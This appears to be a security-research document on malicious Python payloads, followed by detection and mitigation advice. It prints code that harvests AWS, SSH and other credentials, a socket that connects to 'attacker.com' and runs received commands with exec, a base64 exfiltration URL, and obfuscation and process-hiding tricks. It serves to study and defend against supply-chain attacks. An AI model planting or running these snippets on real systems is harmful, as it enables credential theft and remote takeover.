# Malicious Payloads

**Real-World Attack Scenarios and Exploitation Examples**

## Overview

This section demonstrates concrete attack scenarios showing how malicious Python code can exploit target systems and achieve attacker objectives. These are representative payloads showing the kinds of attacks possible once code execution is achieved.

### Payload Categories

1. **Credential Theft** — Extract and exfiltrate credentials, tokens, API keys
2. **System Reconnaissance** — Gather system information for further attacks
3. **Data Exfiltration** — Steal sensitive data and send to attacker servers
4. **Persistence** — Maintain access across reboots and sessions
5. **Lateral Movement** — Compromise related systems and services

### Design Principles

Each payload demonstrates:
- **Realistic Attack Goal** — What attackers actually try to achieve
- **Minimal Dependencies** — Only stdlib when possible (portable)
- **Operational Security** — Stealth and evasion techniques
- **Detection Avoidance** — Common detection bypasses
- **Real-World Impact** — Actual harm from the attack

## Common Payload Patterns

### Credential/Secret Harvesting

Extract sensitive information from environment:

```python
import os

# Environment variables
aws_keys = os.getenv('AWS_ACCESS_KEY_ID')
github_token = os.getenv('GITHUB_TOKEN')

# .ssh directory
ssh_keys = os.path.expanduser('~/.ssh')

# .aws credentials
aws_creds = os.path.expanduser('~/.aws/credentials')

# .config for various tools
config_dirs = [
    '~/.kube/config',
    '~/.docker/config.json',
    '~/.npmrc',
]
```

### Process Spawning & Command Execution

```python
import subprocess
import os

# Disable output to hide execution
result = subprocess.run(
    ['id'],
    capture_output=True,
    shell=False
)

# Or with shell (higher risk but more flexible)
output = subprocess.getoutput('whoami')
```

### Network Communication (C2)

```python
import socket
import json

# Connect to command & control server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.com', 4444))

# Receive and execute commands
data = s.recv(1024)
exec(data)  # DANGEROUS: Code execution
```

### Data Exfiltration

```python
import urllib.request
import base64

# Exfiltrate credential to attacker server
credential = "aws_key_12345"
exfil_url = f"http://attacker.com/log?data={base64.b64encode(credential.encode())}"
urllib.request.urlopen(exfil_url)
```

### File System Access

```python
import os
import glob

# Enumerate sensitive files
config_files = glob.glob(os.path.expanduser('~/.config/**'), recursive=True)
ssh_keys = glob.glob(os.path.expanduser('~/.ssh/*'))

# Read sensitive files
with open(os.path.expanduser('~/.ssh/id_rsa')) as f:
    private_key = f.read()
```

## Payload Examples

### steal-aws-credentials

**Objective**: Extract and exfiltrate AWS credentials  
**Target**: Developers with AWS credentials in environment/config  
**Impact**: Unauthorized AWS API access, data theft, resource abuse  

**Techniques**:
- Environment variable harvesting
- ~/.aws/credentials file parsing
- ~/.aws/config parsing  
- AWS session token theft
- EC2 instance metadata access (if running on EC2)
- STS temporary credentials

**Detection Points**:
- File access to ~/.aws/*
- Environment variable reads
- Network connection to attacker server
- AWS API calls from unexpected IP

**Mitigation**:
- Use IAM roles (not long-term credentials in files)
- Credential validation before execution
- Regular credential rotation
- Monitor ~/.aws/* with file integrity monitoring

## Anti-Detection Techniques

### Obfuscation

```python
# String obfuscation
import codecs
cmd = codecs.decode('abc123def456', 'hex_codec')

# Dynamic imports
__import__('subprocess').call('whoami')

# Encoded payloads
import base64
payload = base64.b64decode('aW1wb3J0IGRv...')
exec(payload)
```

### Process Hiding

```python
# Run in background
import subprocess
import os
subprocess.Popen(
    ['malicious_binary'],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    start_new_session=True  # Detach from parent
)
```

### Network Stealth

```python
# Use HTTPS to blend with normal traffic
import urllib.request
urllib.request.urlopen('https://attacker.com/normal_path')

# Use DNS over HTTPS
import urllib.request
urllib.request.urlopen('https://dns.cloudflare.com/dns-query?name=attacker.com')

# Randomized intervals for beaconing
import random
import time
time.sleep(random.randint(3600, 7200))  # 1-2 hour intervals
```

### System Call Masking

```python
# Change process name
import sys
sys.argv[0] = '/usr/bin/python3'

# Hide from process listing
import ctypes
ctypes.CDLL(None).prctl(15, b'sshd')  # Linux only
```

## Detection Strategies

### Code Review

1. **Imports to Watch**
   - `subprocess`, `os.system`, `eval`, `exec`
   - `socket`, `urllib`, `requests` (network)
   - `ctypes` (low-level system access)
   - Encoding libraries (base64, codecs, binascii)

2. **Suspicious Patterns**
   - Dynamic code execution (eval, exec, exec())
   - Subprocess spawning during import
   - Network connections in __init__
   - Environment variable access
   - Home directory enumeration

3. **Time-Based Indicators**
   - Installation hooks that take time
   - Setup.py that spawns threads
   - Delayed execution patterns

### Runtime Monitoring

1. **System Call Tracing**
   ```bash
   strace -f -e trace=process,network python3 setup.py install
   ```

2. **Network Monitoring**
   - Monitor outbound connections during package installation
   - Alert on connections to unknown IP addresses
   - Check DNS resolution during setup

3. **Process Monitoring**
   - Monitor subprocess spawning
   - Track file system modifications
   - Alert on suspicious privilege escalation

## Responsible Disclosure

When testing these payloads:

1. **Use Isolated Environment**
   - Disposable VMs or containers
   - No network connectivity
   - No sensitive data or credentials

2. **Document Findings**
   - Record what works and why
   - Document environment details
   - Keep detailed notes for improvement

3. **Destruction**
   - Completely destroy test environments
   - Never reuse test systems
   - Wipe temporary files and logs

## Disclaimer

These payloads are examples of how Python can be abused for malicious purposes. They should ONLY be tested:

- In authorized security assessments
- In isolated lab environments
- With explicit permission from system owners
- In CTF or educational contexts with proper authorization

Unauthorized access to computer systems is illegal.